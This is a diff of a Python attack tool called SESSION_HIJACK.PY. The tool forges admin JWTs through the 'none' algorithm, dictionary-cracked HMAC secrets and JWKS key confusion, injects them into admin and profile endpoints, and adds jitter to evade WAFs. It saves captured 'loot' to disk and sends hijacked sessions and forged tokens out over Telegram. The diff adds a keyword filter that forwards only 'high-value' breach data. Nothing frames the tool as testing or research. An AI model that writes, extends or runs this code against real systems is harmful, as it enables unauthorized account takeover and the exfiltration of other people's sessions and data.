@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-SESSION_HIJACK.PY v8.6 — Advanced Session Forging & Privilege Escalation Module (Elite Red Team Adversarial Edition)
+SESSION_HIJACK.PY v8.8 — Advanced Session Forging & Privilege Escalation Module (Elite Red Team Adversarial Edition)
 Features:
-- Multi-vector session injection (Bearer Auth headers + Cookie Jar session injection + Custom headers)
-- Cryptographic JWT secret dictionary cracking, algorithm downgrade ('none'), and JWKS Key Confusion (RS256 -> HS256)
-- Poisson behavioral jitter and randomized client hint injection for advanced WAF evasion
-- Strict response schema validation (Zero false-positives: verifies JSON privilege objects & differential sizes)
-- Automated immutable disk exfiltration (loot_output/) with SHA-256 cryptographic integrity hashing
-- Real-time asynchronous Telegram notification dispatch for unredacted session loot & forged tokens
+- Zero-noise filtering: Restricts Telegram alerts strictly to verified high-value breach loot, hijacked sessions, and forged tokens.
+- Multi-vector session injection (Bearer Auth headers + Cookie Jar session injection + Custom headers).
+- Cryptographic JWT secret dictionary cracking, algorithm downgrade ('none'), and JWKS Key Confusion (RS256 -> HS256).
+- Poisson behavioral jitter and randomized client hint injection for advanced WAF evasion.
+- Strict response schema validation and automated immutable disk exfiltration (loot_output/).
 """
 import asyncio
 import sys
@@ -42,6 +41,12 @@ COLORS = {
     "RESET": "\033[0m",
 }
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege"
+]
+
 def log(msg, color="GREEN"):
     ansi_color = COLORS.get(color, color)
     sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
@@ -49,13 +54,19 @@ def log(msg, color="GREEN"):
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        check_str = f"{loot_type} {str(details)}".lower()
+        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
     except Exception:
         pass
 
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions with zero-noise filtering."""
     try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            return  # Suppress low-priority telemetry chatter completely
+
         loop = asyncio.get_running_loop()
         if loop.is_running():
             loop.create_task(broadcast_tg_alert_async(loot_type, details))
@@ -79,7 +90,6 @@ def sign_hs256(header_payload_str, secret):
     return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")
 
 async def establish_baseline(client, base_url, endpoints):
-    """Establishes an unauthenticated baseline response size and content for differential comparison."""
     baselines = {}
     for endpoint in endpoints:
         apply_behavioral_jitter()
@@ -95,7 +105,6 @@ async def establish_baseline(client, base_url, endpoints):
     return baselines
 
 async def fetch_jwks_public_key(client, base_url):
-    """Attempts to fetch JWKS public key for advanced Key Confusion attacks (RS256 -> HS256)."""
     jwks_paths = ["/.well-known/jwks.json", "/api/jwks.json", "/oauth/jwks.json"]
     for path in jwks_paths:
         try:
@@ -110,7 +119,7 @@ async def fetch_jwks_public_key(client, base_url):
     return None
 
 async def run_session_hijack(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING ELITE SESSION HIJACKING & TOKEN FORGING MODULE (WAF HARDENED) [***]", "MAGENTA")
+    log("\n[***] INITIALIZING ELITE SESSION HIJACKING & TOKEN FORGING MODULE (V8.8 HARDENED) [***]", "MAGENTA")
     
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     base_url = f"{parsed.scheme}://{parsed.hostname}"
@@ -121,23 +130,17 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
     target_endpoints = ["/admin", "/dashboard", "/api/admin", "/api/user/profile", "/api/v1/user/profile", "/api/settings"]
 
     async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8.0) as client:
-        log("[*] Establishing unauthenticated baseline responses for differential comparison...", "CYAN")
         baselines = await establish_baseline(client, base_url, target_endpoints)
 
-        # Fetch JWKS public key for key confusion if available
         jwks_content = await fetch_jwks_public_key(client, base_url)
         if jwks_content:
-            log("[+] Discovered JWKS endpoint! Adding public-key bytes to cryptographic key confusion dictionary.", "GREEN")
             COMMON_SECRETS.append(jwks_content)
 
-        # 1. Generate 'none' algorithm token
-        log("[*] Generating forged admin/superuser JWT payloads with 'none' algorithm...", "CYAN")
         header_none = base64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
         payload_data = {"user": "admin", "role": "superuser", "isAdmin": True, "sub": "admin_bypass", "permissions": ["all"]}
         payload = base64url_encode(json.dumps(payload_data))
         forged_jwt_none = f"{header_none}.{payload}."
         
-        # 2. Generate HMAC weak secret tokens across dictionary secrets
         header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
         header_payload_str = f"{header_hs}.{payload}"
         
@@ -148,9 +151,7 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
         for secret in COMMON_SECRETS:
             sig = sign_hs256(header_payload_str, secret)
             forged_jwt_hs = f"{header_payload_str}.{sig}"
-            tokens_to_test.append((f"HMAC Secret Brute-Force [{str(secret)[:15]}...] WAF-Bypassed", forged_jwt_hs))
-
-        log(f"[*] Actively injecting {len(tokens_to_test)} forged tokens across {len(target_endpoints)} endpoints with behavioral jitter...", "CYAN")
+            tokens_to_test.append((f"HMAC Secret Brute-Force [{str(secret)[:15]}...]", forged_jwt_hs))
 
         for vector_name, token in tokens_to_test:
             if not token:
@@ -212,7 +213,6 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                                 "extracted_data": extracted_json_data or body[:400]
                             }
 
-                            # STREAM LIVE TELEMETRY, DISK PERSISTENCE & TELEGRAM NOTIFICATION
                             broadcast_tg_alert_sync(f"Verified Session Hijack ({vector_name})", loot_payload)
                             stream_proof("SESSION_HIJACK_BREACH", endpoint, {"vector": vector_name, "token": token}, body, extracted_json_data or {"status": status})
                             save_session_loot(
@@ -234,9 +234,7 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                                 "response_snippet": body[:300]
                             })
                             break
-                        else:
-                            log(f"[-] Endpoint {endpoint} rejected {vector_name} (Status: {status})", "GRAY")
-                    except Exception as exc:
+                    except Exception:
                         pass
 
     if not hijack_findings:
@@ -247,5 +245,5 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
     return hijack_findings
 
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobyte.online"
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://"
     asyncio.run(run_session_hijack(target))
